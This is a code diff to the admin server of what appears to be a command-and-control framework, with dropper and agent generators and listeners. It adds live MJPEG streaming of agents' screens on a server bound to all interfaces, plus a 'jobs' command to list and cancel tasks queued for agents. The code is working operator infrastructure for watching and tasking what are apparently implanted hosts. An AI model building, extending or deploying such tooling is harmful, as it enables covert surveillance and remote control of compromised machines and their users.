@@ -7,6 +7,7 @@ import ssl
 import os
 import json
 import re
+import time
 import uuid as uuid_lib
 from flask import (
     Flask,
@@ -18,6 +19,7 @@ from flask import (
     session,
     flash,
     make_response,
+    Response,
 )
 from datetime import datetime
 from database.operations import AgentDatabase
@@ -26,6 +28,7 @@ from utils.file_upload import FileUploadManager
 from utils.dropper_generator import DropperGenerator
 from utils.agent_generator import AgentGenerator
 from servers.listener_manager import build_listener_config
+from servers.screen_server import ScreenStreamServer
 
 
 class AdminServer:
@@ -49,6 +52,9 @@ class AdminServer:
             self.agent_generator = None
         import os
         self.app.secret_key = os.urandom(24)
+        stream_port = config_loader.get_stream_port()
+        self.screen_server = ScreenStreamServer(host="0.0.0.0", port=stream_port, logger=logger)
+        self.screen_server.start()
         self._setup_middleware()
         self._setup_routes()
         self._setup_error_handlers()
@@ -218,6 +224,23 @@ class AdminServer:
         def generate_agent_for_listener(listener_id):
             return self._generate_agent_for_listener(listener_id)
 
+        # ---- Screen streaming ----
+        @self.app.route("/api/screen/stream/<uuid>")
+        @login_required(self.auth_manager)
+        def screen_stream(uuid):
+            return self._screen_mjpeg_stream(uuid)
+
+        @self.app.route("/api/screen/status")
+        @login_required(self.auth_manager)
+        def screen_status():
+            return jsonify({"active": self.screen_server.get_active_streams()})
+
+        @self.app.route("/api/screen/stop/<uuid>", methods=["POST"])
+        @login_required(self.auth_manager)
+        def screen_stop(uuid):
+            self.screen_server.stop_stream(uuid)
+            return jsonify({"success": True})
+
     def _setup_error_handlers(self):
         @self.app.errorhandler(404)
         def not_found(error):
@@ -297,6 +320,13 @@ class AdminServer:
             help_output = self._generate_command_help(command_name)
             self.db.set_command_output(uuid, help_output)
             self.db.add_command_history(uuid, cmd, help_output, username)
+            return redirect("/")
+
+        jobs_match = re.match(r'^jobs\s+(.+)$', cmd.lower().strip())
+        if cmd.lower() == "jobs" or (jobs_match and jobs_match.group(1).split()[0] in ("list", "kill")):
+            jobs_output = self._handle_jobs_command(uuid, cmd[4:].strip() if len(cmd) > 4 else "")
+            self.db.set_command_output(uuid, jobs_output)
+            self.db.add_command_history(uuid, cmd, jobs_output, username)
             return redirect("/")
 
         parts = cmd.split(' ', 1)
@@ -388,6 +418,48 @@ class AdminServer:
             help_output += "This command has no parameters.\n"
         help_output += "\nTactics: " + cmd_info.get('description', '').split(' ')[-1] if '(' in cmd_info.get('description', '') else ""
         return help_output
+
+    def _handle_jobs_command(self, uuid, args):
+        args = args.strip().lower()
+
+        if args == "" or args == "list":
+            tasks = self.db.get_tasks_for_jobs(uuid)
+            if not tasks:
+                return "No tasks found for this agent."
+
+            STATUS_LABELS = {
+                "queued":     "queued    ",
+                "dispatched": "executing ",
+                "completed":  "completed ",
+            }
+            col_cmd = max(len(t["command"]) for t in tasks)
+            col_cmd = max(col_cmd, 7)
+
+            header  = f"{'ID':<6}  {'Status':<10}  {'Operator':<12}  {'Queued':<19}  Command"
+            divider = "-" * (6 + 2 + 10 + 2 + 12 + 2 + 19 + 2 + col_cmd)
+            lines = ["Jobs\n" + "=" * len(header), header, divider]
+
+            for t in tasks:
+                label   = STATUS_LABELS.get(t["status"], t["status"].ljust(10))
+                cmd_str = t["command"] if len(t["command"]) <= 60 else t["command"][:57] + "..."
+                op      = (t["operator"] or "-")[:12]
+                ts      = (t["timestamp"] or "-")[:19]
+                lines.append(f"{t['id']:<6}  {label}  {op:<12}  {ts:<19}  {cmd_str}")
+
+            lines.append(f"\nTotal: {len(tasks)} task(s)  |  Use 'jobs kill <id>' to cancel queued/executing tasks")
+            return "\n".join(lines)
+
+        kill_match = re.match(r'^kill\s+(\d+)$', args)
+        if kill_match:
+            task_id = int(kill_match.group(1))
+            success, detail = self.db.cancel_task(task_id, uuid)
+            if success:
+                warn = " (agent may have already received it)" if detail == "dispatched" else ""
+                return f"[+] Task {task_id} cancelled{warn}"
+            else:
+                return f"[!] Cannot cancel task {task_id}: {detail}"
+
+        return "Usage: jobs list  |  jobs kill <id>"
 
     def _is_valid_command(self, command_name):
         return command_name in self.command_config.get("commands", {})
@@ -781,6 +853,26 @@ class AdminServer:
             or filename.startswith("\\")
             or ":" in filename
             or "\\" in filename
+        )
+
+    # ------------------------------------------------------------------
+    # Screen streaming
+    # ------------------------------------------------------------------
+
+    def _screen_mjpeg_stream(self, uuid):
+        def generate():
+            while self.screen_server.is_streaming(uuid):
+                frame = self.screen_server.get_latest_frame(uuid)
+                if frame:
+                    yield (
+                        b"--frame\r\n"
+                        b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n"
+                    )
+                time.sleep(0.1)
+
+        return Response(
+            generate(),
+            mimetype="multipart/x-mixed-replace; boundary=frame",
         )
 
     # ------------------------------------------------------------------
